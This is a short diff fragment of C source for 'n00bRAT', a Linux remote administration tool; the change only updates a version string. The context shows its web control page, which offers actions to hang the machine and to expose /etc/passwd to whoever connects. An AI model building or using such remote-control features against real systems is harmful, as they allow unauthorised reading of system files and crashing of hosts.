@@ -17,7 +17,7 @@ char httpResponse[MAXSTRSIZE]="\0";
 char *httpResponse200 = "HTTP/1.1 200 OK\nServer: n00b\nContent-Type: text/html\n\n"
                         "<html><head><title>it\'s n00bRAT, you control this machine here</title></head>"
                         "<body><center><h1>-=n00bRAT=-</h1>"
-                        "<h3>TuX Remote Administration Tool v0.5Beta</h3>"
+                        "<h3>TuX Remote Administration Tool v0.6</h3>"
                         "even a Novice could use this RAT like a Pro</center>"
                         "<div id=\'actions\'><a href=\'0\'>Hang The Machine</a><br/>"
                         "<a href=\'1\'>/etc/passwd</a><br/>"
